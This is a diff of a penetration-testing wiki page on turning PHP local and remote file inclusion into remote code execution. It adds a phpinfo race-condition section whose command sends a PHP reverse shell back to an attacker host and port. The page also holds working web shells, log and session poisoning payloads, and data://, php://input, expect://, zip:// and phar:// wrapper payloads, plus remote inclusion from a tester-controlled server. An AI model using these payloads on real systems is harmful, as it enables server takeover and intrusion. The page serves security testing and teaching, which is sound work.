@@ -86,9 +86,9 @@ As code execution functions can be filtered, the phpinfo testing phase is requir
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
-## Local File Inclusion
+## LFI to RCE
 
-### LFI to RCE (via logs poisoning)
+### via logs poisoning
 
 {% hint style="warning" %}
 Log files may be stored in different locations depending on the operating system/distribution.
@@ -197,9 +197,27 @@ telnet $TARGET_IP $TARGET_PORT
 curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
 ```
 
-### 🛠️ LFI to RCE (via phpinfo)
+### via phpinfo
 
-### LFI to RCE (via file upload)
+{% hint style="info" %}
+The prerequisites for this method are :
+
+* having `file_uploads=on` set in the PHP configuration file
+* having access to the output of the phpinfo() function
+{% endhint %}
+
+When `file_uploads=on` is set in the PHP configuration file, it is possible to upload a file by POSTing it on any PHP file ([RFC1867](https://www.ietf.org/rfc/rfc1867.txt)). This file is put to a temporary location on the server and deleted after the HTTP request is fully processed.
+
+The aim of the attack is to POST a PHP reverse shell on the server and delay the processing of the request by adding very long headers to it. This gives enough time to find out the temporary location of the reverse shell using the output of the `phpinfo()` function and including it via the LFI before it gets removed.
+
+The [lfito\_rce](https://github.com/roughiz/lfito\_rce) (Python2) script implements this attack.
+
+```bash
+#There is no requirements.txt, the dependencies have to be installed manually
+python lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
+```
+
+### via file upload
 
 #### Image Upload
 
@@ -218,10 +236,15 @@ curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
 Other _LFI to RCE via file upload_ methods may be found later on the chapter [LFI to RCE (via php wrappers)](file-inclusion.md#lfi-to-rce-via-php-wrappers)
 {% endhint %}
 
-### LFI to RCE (via php wrappers)
+### via PHP wrappers and streams
 
-#### Data wrapper
+<details>
 
+<summary>data://</summary>
+
+The attribute `allow_url_include` must be set. This configuration can be checked in the `php.ini` file.
+
+{% code overflow="wrap" %}
 ```bash
 # Shell in base64 encoding
 echo "<?php system($_GET['cmd']); ?>" | base64
@@ -229,40 +252,52 @@ echo "<?php system($_GET['cmd']); ?>" | base64
 # Accessing the log file via LFI
 curl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id"
 ```
+{% endcode %}
 
-{% hint style="warning" %}
-The attribute `allow_url_include` should be set. \
-This configuration can be checked in the `php.ini` file.
-{% endhint %}
+</details>
 
-#### Input wrapper
+<details>
 
+<summary>php://input</summary>
+
+The attribute `allow_url_include` should be set. This configuration can be checked in the `php.ini` file.
+
+{% code overflow="wrap" %}
 ```bash
 # Testers should make sure to change the $URL
 curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
 ```
+{% endcode %}
 
-{% hint style="warning" %}
-The attribute `allow_url_include` should be set. \
-This configuration can be checked in the `php.ini` file.
-{% endhint %}
+</details>
 
-#### Except wrapper&#x20;
+<details>
+
+<summary>php://filter</summary>
+
+//TODO : [https://twitter.com/c3l3si4n/status/1560418431878500352](https://twitter.com/c3l3si4n/status/1560418431878500352)
+
+</details>
+
+<details>
+
+<summary>except://</summary>
+
+The `except` wrapper doesn't required the `allow_url_include` configuration, the `except` extension is required instead.
 
 ```bash
 curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
 ```
 
-{% hint style="warning" %}
-The `except` wrapper doesn't required the `allow_url_include` configuration, instead, it needs the `except extension.`
-{% endhint %}
+</details>
 
-#### Zip wrapper - File Upload&#x20;
+<details>
 
-{% hint style="info" %}
+<summary>zip://</summary>
+
 The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
-{% endhint %}
 
+{% code overflow="wrap" %}
 ```bash
 echo "<?php system($_GET['cmd']); ?>" > payload.php
 zip payload.zip payload.php
@@ -270,12 +305,15 @@ zip payload.zip payload.php
 # Accessing the log file via LFI (the # identifier is URL-encoded)
 curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id"
 ```
+{% endcode %}
 
-#### Phar wrapper - File Upload
+</details>
 
-{% hint style="info" %}
+<details>
+
+<summary>phar://</summary>
+
 The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
-{% endhint %}
 
 ```php
 <?php
@@ -295,13 +333,15 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
 Now the tester has a `phar` file named `shell.jpg` and he can trigger it through the `phar://` wrapper.
 
+{% code overflow="wrap" %}
 ```bash
 curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
 ```
+{% endcode %}
 
+</details>
 
-
-### 🛠️ LFI to RCE (via /proc)
+### 🛠️ via /proc
 
 #### /proc/self/environ
 
@@ -315,7 +355,7 @@ curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../pr
 
 #### 🛠️ /proc/\*/fd
 
-### LFI to RCE (via PHP session)
+### via PHP session
 
 When a web server wants to handle sessions, it can use PHP session cookies (PHPSESSID).
 
@@ -356,9 +396,9 @@ GET /?user=/var/lib/php/sessions/sess_[PHPSESSID]&cmd=id HTTP/2
 ";lang|s:7:"English";
 ```
 
-## Remote File Inclusion&#x20;
+## RFI to RCE
 
-### RFI to RCE (via HTTP)
+### via HTTP
 
 The tester can host an arbitrary PHP code and access it through the **HTTP** protocol
 
@@ -373,7 +413,7 @@ python3 -m http.server 80
 curl '$URL/?parameter=http://tester.server/phpinfo.php'
 ```
 
-### RFI to RCE (via FTP)
+### via FTP
 
 The tester can also host his arbitrary PHP code and access it through the **FTP** protocol. He can use the python library **pyftpdlib** to start a FTP server.
 
@@ -395,7 +435,7 @@ PHP uses the **anonymous** credentials to authenticate to the FTP server. If the
 <mark style="color:blue;">`curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`</mark>
 {% endhint %}
 
-### RFI to RCE (via SMB)
+### via SMB
 
 Sometimes, the vulnerable web application is hosted on a **Windows Server,** meaning the attacker could log into a **SMB Server** to store the arbitrary PHP code.&#x20;
 
